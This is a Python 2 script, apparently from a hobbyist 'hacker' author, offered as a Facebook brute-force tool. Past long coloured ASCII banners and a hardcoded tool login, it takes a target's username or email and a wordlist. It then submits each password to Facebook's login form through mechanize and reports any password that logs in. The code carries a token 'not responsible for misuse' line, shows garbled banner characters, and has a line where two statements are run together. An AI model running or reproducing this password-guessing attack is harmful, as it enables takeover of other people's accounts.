#!/usr/bin/python

# -*- coding: utf-8 -*-

#CODER : SaaM 

# FACEBOOK:https://www.facebook.com/itxay.an.773

        

        #############################################

        #                                           #

        #    Facebook BruteForce, by  SAAM HACKERðŸ˜ˆâœ” #

        #    Facebook Contact: https://www.facebook.com/itxay.an.773           #

        #                                           #

        #############################################

import time

import os

os.system('clear')

time.sleep(0.5)

try:

    import mechanize

except ModuleNotFoundError:

    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'

    exit()

print """ 

     \033[1;92m â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘

     \033[1;92m â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—

     \033[1;92m â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•

     \033[1;96m â–‘â•šâ•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â–‘â–‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—

     \033[1;96m â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘

     \033[1;96m â•šâ•â•â•â•â•â•â–‘â•šâ•â•â–‘â–‘â–‘â–‘â–‘â•šâ•â•â•šâ•â•â•â•â•â•â–‘â•šâ•â•â•â•â•â•â•â•šâ•â•â–‘â–‘â•šâ•â•

          \033[1;91m â–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–‘â–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•—

          \033[1;91m â–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•‘

          \033[1;91m â–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘

          \033[1;93m â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘

          \033[1;93m â–ˆâ–ˆâ•‘â–‘â•šâ•â•â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â•šâ–ˆâ–ˆâ–ˆâ•‘

          \033[1;93m â•šâ•â•â–‘â–‘â–‘â–‘â–‘â•šâ•â•â•šâ•â•â–‘â–‘â•šâ•â•â•šâ•â•â–‘â–‘â•šâ•â•â•

  

  \033[1;96m AUTHOR: SAAM HACKERâœ”

  \033[1;94m FACEBOOK: https://www.facebook.com/itxay.an.773

###############

"""

CorrectUsername = "SAAM"

CorrectPassword = "KhAn"

loop = 'true'

while (loop == 'true'):

    username = raw_input("\033[1;92m \x1b[1;93mTOOL USERNAME \x1b[1;96m>>>> ")

    if (username == CorrectUsername):

    	password = raw_input("\033[1;92m \x1b[1;93mTOOL PASSWORD \x1b[1;96m>>>> ")        if (password == CorrectPassword):

            print "Logged in successfully as SAAM KHAN" 

            loop = 'false'

            os.system('xdg-open https://www.facebook.com/itxay.an.773')

        else:

            print "Wrong Password"

            os.system('xdg-open https://www.facebook.com/itxay.an.773')

    else:

        print "Wrong Username"

        os.system('xdg-open https://www.facebook.com/itxay.an.773')

time.sleep(0.5)

print """ 

  \033[1;92m ___________Â¶________________________________Â¶_____________

  \033[1;92m ___________Â¶___Â¶__________________________Â¶___Â¶___________

  \033[1;92m ___________Â¶__Â¶____________________________Â¶__Â¶___________

  \033[1;92m __________Â¶___Â¶____________________________Â¶___Â¶__________

  \033[1;92m __________Â¶__Â¶Â¶____________________________Â¶Â¶__Â¶__________

  \033[1;92m __________Â¶__Â¶______________________________Â¶__Â¶__________

  \033[1;92m __________Â¶__Â¶______________________________Â¶__Â¶__________

  \033[1;92m _________Â¶Â¶__Â¶______________________________Â¶__Â¶Â¶_________

  \033[1;92m _________Â¶Â¶__Â¶______________________________Â¶__Â¶Â¶_________

  \033[1;92m _________Â¶Â¶__Â¶______________________________Â¶__Â¶Â¶_________

  \033[1;92m ______Â¶__Â¶Â¶__Â¶______________________________Â¶__Â¶Â¶__Â¶______

  \033[1;92m ______Â¶__Â¶Â¶__Â¶_____________________________Â¶Â¶__Â¶Â¶__Â¶______

  \033[1;92m ______Â¶__Â¶Â¶__Â¶Â¶____________________________Â¶Â¶__Â¶Â¶__Â¶______

  \033[1;92m ______Â¶___Â¶___Â¶____________________________Â¶___Â¶___Â¶______

  \033[1;92m ______Â¶Â¶__Â¶___Â¶_________Â¶________Â¶_________Â¶___Â¶__Â¶Â¶______

  \033[1;92m _______Â¶__Â¶Â¶__Â¶Â¶_______Â¶__________Â¶_______Â¶Â¶__Â¶Â¶__Â¶_______

  \033[1;91m _______Â¶___Â¶___Â¶_______Â¶__________Â¶_______Â¶___Â¶___Â¶_______

  \033[1;91m _______Â¶Â¶__Â¶Â¶__Â¶Â¶_____Â¶____________Â¶_____Â¶___Â¶Â¶__Â¶Â¶_______

  \033[1;91m _______Â¶Â¶_Â¶Â¶Â¶___Â¶Â¶____Â¶____________Â¶____Â¶Â¶___Â¶Â¶Â¶Â¶Â¶Â¶_______

  \033[1;91m ________Â¶Â¶__Â¶Â¶___Â¶___Â¶Â¶____________Â¶____Â¶___Â¶Â¶__Â¶Â¶________

  \033[1;91m ________Â¶____Â¶_Â¶__Â¶__Â¶______________Â¶__Â¶__Â¶_Â¶____Â¶________

  \033[1;91m _______Â¶_Â¶__Â¶Â¶_Â¶___Â¶_Â¶______________Â¶_Â¶___Â¶_Â¶Â¶_Â¶Â¶_Â¶_______

  \033[1;91m _________Â¶Â¶Â¶Â¶__Â¶Â¶____Â¶______________Â¶____Â¶Â¶__Â¶Â¶Â¶Â¶_________

  \033[1;91m __________Â¶Â¶____Â¶Â¶___Â¶______________Â¶___Â¶Â¶____Â¶Â¶__________

  \033[1;91m _________Â¶Â¶Â¶Â¶____Â¶___Â¶Â¶____________Â¶Â¶___Â¶____Â¶Â¶Â¶Â¶_________

  \033[1;91m ________Â¶__Â¶Â¶_____Â¶Â¶___Â¶___Â¶Â¶Â¶Â¶___Â¶___Â¶Â¶_____Â¶Â¶__Â¶________

  \033[1;91m _______Â¶____Â¶Â¶__Â¶Â¶_Â¶Â¶Â¶__Â¶Â¶_Â¶Â¶Â¶Â¶_Â¶Â¶__Â¶Â¶Â¶_Â¶Â¶__Â¶Â¶____Â¶_______

  \033[1;91m ______Â¶______Â¶Â¶Â¶Â¶___Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶_Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶___Â¶_Â¶Â¶______Â¶______

  \033[1;91m _____Â¶_______Â¶Â¶Â¶_____Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶_____Â¶Â¶Â¶_______Â¶_____

  \033[1;91m ___________Â¶Â¶Â¶_Â¶Â¶__Â¶Â¶Â¶__Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶__Â¶Â¶Â¶__Â¶Â¶_Â¶Â¶____________

  \033[1;91m __________Â¶Â¶Â¶_____Â¶Â¶___Â¶___Â¶Â¶Â¶Â¶___Â¶___Â¶Â¶_____Â¶Â¶Â¶__________

  \033[1;91m _________Â¶Â¶Â¶_____Â¶Â¶__Â¶Â¶__Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶__Â¶Â¶__Â¶Â¶_____Â¶Â¶Â¶_________

  \033[1;91m __________Â¶Â¶____Â¶Â¶__Â¶Â¶__Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶__Â¶Â¶__Â¶____Â¶Â¶Â¶__________

  \033[1;91m ___________Â¶Â¶Â¶__Â¶___Â¶Â¶__Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶__Â¶Â¶___Â¶__Â¶Â¶Â¶___________

  \033[1;91m _____Â¶_______Â¶Â¶_Â¶___Â¶Â¶_Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶_Â¶Â¶___Â¶_Â¶Â¶_______Â¶_____

  \033[1;91m ______Â¶______Â¶Â¶Â¶Â¶___Â¶Â¶__Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶__Â¶Â¶___Â¶_Â¶Â¶______Â¶______

  \033[1;91m _______Â¶____Â¶Â¶_Â¶_Â¶__Â¶___Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶___Â¶__Â¶_Â¶_Â¶Â¶____Â¶_______

  \033[1;91m ________Â¶__Â¶Â¶__Â¶_Â¶Â¶_Â¶_____Â¶Â¶Â¶Â¶Â¶Â¶_____Â¶_Â¶Â¶_Â¶__Â¶Â¶__Â¶________

  \033[1;91m _________Â¶_Â¶Â¶__Â¶_Â¶Â¶_Â¶_______Â¶Â¶_______Â¶_Â¶Â¶_Â¶__Â¶Â¶Â¶Â¶_________

  \033[1;91m __________Â¶Â¶____Â¶Â¶__Â¶Â¶Â¶____________Â¶Â¶Â¶__Â¶Â¶____Â¶Â¶__________

  \033[1;91m _________Â¶Â¶Â¶Â¶_______Â¶Â¶______________Â¶Â¶_______Â¶Â¶Â¶Â¶_________

  \033[1;91m _______Â¶_Â¶__Â¶Â¶Â¶____Â¶_Â¶______________Â¶_Â¶____Â¶Â¶Â¶_Â¶Â¶_Â¶_______

  \033[1;91m ________Â¶____Â¶Â¶___Â¶__Â¶______________Â¶_Â¶Â¶___Â¶Â¶____Â¶________

  \033[1;91m ________Â¶Â¶__Â¶Â¶___Â¶Â¶__Â¶Â¶____________Â¶Â¶__Â¶Â¶___Â¶Â¶__Â¶Â¶________

  \033[1;91m _______Â¶Â¶Â¶Â¶Â¶Â¶Â¶__Â¶Â¶____Â¶____________Â¶____Â¶Â¶__Â¶Â¶Â¶Â¶Â¶Â¶Â¶_______

  \033[1;91m _______Â¶Â¶__Â¶Â¶__Â¶Â¶_________________Â¶______Â¶Â¶__Â¶Â¶__Â¶Â¶_______

  \033[1;91m _______Â¶___Â¶___Â¶__________________________Â¶___Â¶___Â¶_______

  \033[1;96m _______Â¶__Â¶Â¶__Â¶Â¶__________________________Â¶Â¶__Â¶Â¶__Â¶_______

  \033[1;96m ______Â¶Â¶__Â¶___Â¶____________________________Â¶___Â¶__Â¶Â¶______

  \033[1;96m ______Â¶___Â¶___Â¶____________________________Â¶___Â¶___Â¶______

  \033[1;96m ______Â¶__Â¶Â¶__Â¶Â¶____________________________Â¶Â¶__Â¶Â¶__Â¶______

  \033[1;96m ______Â¶__Â¶Â¶__Â¶Â¶____________________________Â¶Â¶__Â¶Â¶__Â¶______

  \033[1;96m ______Â¶__Â¶Â¶__Â¶______________________________Â¶__Â¶Â¶__Â¶______

  \033[1;96m _________Â¶Â¶__Â¶______________________________Â¶__Â¶Â¶_________

  \033[1;96m _________Â¶Â¶__Â¶______________________________Â¶__Â¶Â¶_________

  \033[1;96m _________Â¶Â¶__Â¶______________________________Â¶__Â¶Â¶_________

  \033[1;96m __________Â¶__Â¶______________________________Â¶__Â¶__________

  \033[1;96m __________Â¶__Â¶______________________________Â¶__Â¶__________

  \033[1;96m __________Â¶__Â¶Â¶____________________________Â¶Â¶__Â¶__________

  \033[1;96m __________Â¶___Â¶____________________________Â¶___Â¶__________

  \033[1;96m _______Â¶__Â¶________________________________Â¶__Â¶___________

  \033[1;96m _______Â¶__________________________________Â¶___Â¶___________

  \033[1;96m ____________Â¶________________________________Â¶____________

  \033[1;93m ____________Â¶________________________________Â¶____________

   \033[1;91m____  ____ ___ ____  _____ ____    __  __    _    _   _

  \033[1;92m/ ___||  _ \_ _|  _ \| ____|  _ \  |  \/  |  / \  | \ | |

  \033[1;91m\___ \| |_) | || | | |  _| | |_) | | |\/| | / _ \ |  \| |

  \033[1;94m ___) |  __/| || |_| | |___|  _ <  | |  | |/ ___ \| |\  |

  \033[1;92m|____/|_|  |___|____/|_____|_| \_\ |_|  |_/_/   \_\_| \_|

  

  \033[1;93m AUTHOR: SAAM HACKERâœ”

\033[1;94m FACEBOOK: SAAM

\033[1;93m FACEBOOK: PAGE:https://www.facebook.com/itxay.an.773

"""

user = raw_input('[âœª] Facebook Target Username/ID/Email ::: ')

time.sleep(0.8)

wrdlstFileName = raw_input('\n[âŠ•] Wordlist Type (saam.txt/hacker.txt) ::: ')

try:

    wordlist = open(wrdlstFileName, 'r')

except FileNotFoundError:

    print ('\n[!] File Not Found!')

    exit()

print """

            \033[1;94m â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–„â–„â–„â–„â–„â–„â–„â–„â–„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

            \033[1;94m â”€â”€â”€â”€â”€â”€â”€â”€â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„â”€â”€â”€â”€â”€â”€â”€â”€

            \033[1;94m â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ

            \033[1;94m â–â–ˆâ–ˆâ–ˆâ–ˆâ–Œâ”€â–€â–ˆâ–ˆâ–ˆâ–„â”€â”€â”€â”€â”€â”€â”€â–„â–ˆâ–ˆâ–ˆâ–€â”€â–â–ˆâ–ˆâ–ˆâ–ˆâ–Œ

            \033[1;94m â”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„â”€â”€â–€â–ˆâ–ˆâ–ˆâ–„â”€â”€â”€â–„â–ˆâ–ˆâ–ˆâ–€â”€â”€â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€

            \033[1;94m â”€â–â–ˆâ–ˆâ–€â–ˆâ–ˆâ–ˆâ–„â”€â”€â–€â–ˆâ–ˆâ–ˆâ–„â–ˆâ–ˆâ–ˆâ–€â”€â”€â–„â–ˆâ–ˆâ–ˆâ–€â–ˆâ–ˆâ–Œâ”€

            \033[1;94m â”€â”€â–ˆâ–ˆâ–ˆâ–„â–€â–ˆâ–ˆâ–ˆâ–„â”€â”€â–€â–ˆâ–ˆâ–ˆâ–€â”€â”€â–„â–ˆâ–ˆâ–ˆâ–€â–„â–ˆâ–ˆâ–ˆâ”€â”€

            \033[1;91m â”€â”€â–â–ˆâ–„â–€â–ˆâ–„â–€â–ˆâ–ˆâ–ˆâ”€â–„â”€â–€â”€â–„â”€â–ˆâ–ˆâ–ˆâ–€â–„â–ˆâ–€â–„â–ˆâ–Œâ”€â”€

            \033[1;91m â”€â”€â”€â–ˆâ–ˆâ–ˆâ–„â–€â–ˆâ–„â–ˆâ–ˆâ”€â–ˆâ–ˆâ–„â–ˆâ–ˆâ”€â–ˆâ–ˆâ–„â–ˆâ–€â–„â–ˆâ–ˆâ–ˆâ”€â”€â”€

            \033[1;91m â”€â”€â”€â”€â–€â–ˆâ–ˆâ–ˆâ–„â–€â–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–€â–„â–ˆâ–ˆâ–ˆâ–€â”€â”€â”€â”€

            \033[1;91m â”€â”€â”€â–ˆâ–„â”€â–€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–€â”€â–„â–ˆâ”€â”€â”€

            \033[1;91m â”€â”€â”€â–ˆâ–ˆâ–ˆâ”€â”€â”€â”€â”€â”€â”€â”€â–ˆâ–ˆâ–ˆâ”€â”€â”€â”€â”€â”€â”€â”€â–ˆâ–ˆâ–ˆâ”€â”€â”€

            \033[1;91m â”€â”€â”€â–ˆâ–ˆâ–ˆâ–„â”€â”€â”€â”€â–„â–ˆâ”€â–ˆâ–ˆâ–ˆâ”€â–ˆâ–„â”€â”€â”€â”€â–„â–ˆâ–ˆâ–ˆâ”€â”€â”€

            \033[1;91m â”€â”€â”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â–„â–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–„â”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â”€â”€

            \033[1;91m â”€â”€â”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â”€â”€

            \033[1;92m â”€â”€â”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â”€â”€

            \033[1;92m â”€â”€â”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â”€â”€

            \033[1;92m â”€â”€â”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ–„â–„â–„â–„â–„â–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â”€â”€

            \033[1;92m â”€â”€â”€â”€â–€â–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â–ˆâ–ˆâ–ˆâ–€â”€â”€â”€â”€

            \033[1;92m â”€â”€â”€â”€â”€â”€â–€â–ˆâ”€â–ˆâ–ˆâ–ˆâ”€â–„â–„â–„â–„â–„â”€â–ˆâ–ˆâ–ˆâ”€â–ˆâ–€â”€â”€â”€â”€â”€â”€

            \033[1;92m â”€â”€â”€â”€â”€â”€â”€â”€â”€â–€â–ˆâ–Œâ–â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–Œâ–â–ˆâ–€â”€â”€â”€â”€â”€â”€â”€â”€â”€

            \033[1;92m â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

\033[1;94m     +===============================================+

\033[1;92m     |.............   Facebook HACKER   .............|

\033[1;92m     +-----------------------------------------------+

\033[1;92m     |         #Author: SAAM HACKER          | 

\033[1;91m     |	       Version 3.0                            |

 \033[1;92m    |   https://www.facebook.com/itxay.an.773    |   

\033[1;91m    	+===============================================+

\033[1;96m      |..............  fb-Terget  ...............|

     +-----------------------------------------------+\n\n

""" 

time.sleep(0.8)

print '\n\nCracking '+user+' Now...'

time.sleep(1)

print '\nIM NOT RESPONSIBLE FOR ANY MISS USE SAAM HACKER\n'

for password in wordlist:

    if password == '' or password == ' ':

        pass

    else:

        try:

            browser = mechanize.Browser()

            browser.set_handle_robots(False)

            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]

            fb = browser.open('https://facebook.com')

            dos = open('Facebook-Log.txt', 'w+')

            browser.select_form(nr=0)

            browser.form['email'] = user

            browser.form['pass'] = password

            browser.method = 'POST'

            browser.submit()

            dos.write(browser.open('https://facebook.com').read())

            dos.seek(0)

            text = dos.read().decode('UTF-8')

            if text.find('home_icon', 0, len(text)) != -1:

                print '\033[1;96m[âœ”] Password Found >>>>âž¤ '+password 

                dos.close()

                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')

                exit()

            else:

                print "\033[1;96m[âœ˜] Wrong Password >>>âž¤ "+str(password)

        except KeyboardInterrupt:

            print '\n#############################################\n   Exiting..'

            dos.close()

            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')

            exit()

time.sleep(1)

print 'Sorry, none of the passswords in your wordlist is right.'

time.sleep(0.8)

dos.close()

os.system('rm Facebook-Log.txt || del Facebook-Log.txt')

exit()
